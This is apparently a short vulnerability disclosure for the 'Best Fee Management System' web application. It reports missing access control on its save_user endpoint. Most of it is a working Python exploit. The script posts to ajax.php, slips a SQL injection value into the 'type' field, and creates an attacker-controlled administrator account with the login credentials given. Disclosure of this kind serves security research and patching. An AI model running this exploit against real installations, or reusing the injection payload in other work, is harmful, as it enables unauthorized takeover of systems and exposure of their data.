Best Fee Management System POC

There is no other report for the vulnerable.

[CVE SEARCH link](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Best+Fee+Management+System)
![image](https://github.com/movonow/demo/assets/39987032/77c9f56a-a37f-4850-8a69-5fd021128358)

---

## Vulnerability Type
CWE-264: Permissions, Privileges, and Access Controls

## Mitigation
There must be access control for the sentitive interfaces.

## Impact
Allows an attacker to gain full control of the system information.

## Proof of Concept


## Exploit
Setup: `pip install httpx`

```python
import httpx


response = httpx.post(
    url="http://localhost/click_fees/ajax.php?action=save_user",
    data={
        "name": "evil",
        "username": "evil@mars.io",
        "password": "evil",
        "type": "1'#", # SQL injection is necessary, beacuase of a server bug.
    },
    proxies="http://localhost:8080",
)

print(response.text)
```

## Steps To Reproduce
After execute POC script, attacker can login system with:
* username: evil@mars.io 
* password: evil
